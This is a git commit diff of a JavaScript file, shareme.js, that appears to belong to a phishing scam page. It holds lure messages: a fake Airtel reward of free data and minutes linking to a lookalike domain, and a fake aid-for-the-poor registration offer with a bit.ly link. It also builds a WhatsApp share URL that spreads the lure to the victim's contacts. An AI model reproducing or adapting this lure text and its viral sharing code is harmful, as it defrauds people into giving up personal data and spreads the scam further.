5f0ae6f7d6b35de1db2082f47be125822c5a0607
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-01-25 04:20:35 -0800

    Update shareme.js

--- shareme.js
+++ shareme.js
@@ -1,4 +1,4 @@
-  <script>
+
         var text1 = "*Airtel récompense les clients qui utilisent le réseau depuis 1 an et plus avec 10 Go de données gratuites et 1 000 minutes de conversation gratuites.*%0A%0AVÉRIFIER ICI👇👇%0Ahttps://2024-program.xyz/airtelrewards.html",
             text2 = " an amount of ",
             text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
@@ -6,4 +6,4 @@
             abcde = "https://bit.ly/yhauajjdng",
             saved = "",
             share = "whatsapp://send?text=" + text1;
-    </script>
+
